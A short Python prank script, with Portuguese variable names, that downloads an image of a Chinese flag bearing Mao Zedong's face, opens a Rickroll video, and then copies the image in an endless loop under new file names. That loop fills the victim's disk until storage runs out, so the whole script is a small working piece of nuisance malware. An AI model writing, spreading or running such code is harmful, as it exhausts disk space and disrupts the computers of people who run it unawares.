import os
import webbrowser
from wget import download
from random import randint
from shutil import copyfile

link = 'https://thumbs.dreamstime.com/b/bandeira-de-china-com-cara-de-mao-zedong-58366447.jpg'
arquivo= "angela.jpg"
download(link, arquivo)
i = 0
webbrowser.open("https://youtu.be/dQw4w9WgXcQ?si=lt9mBTMUDjOxOvta")
while True:
    copyfile("angela.jpg", os.path.join(f"angela({i}).jpg"))
    i = i+1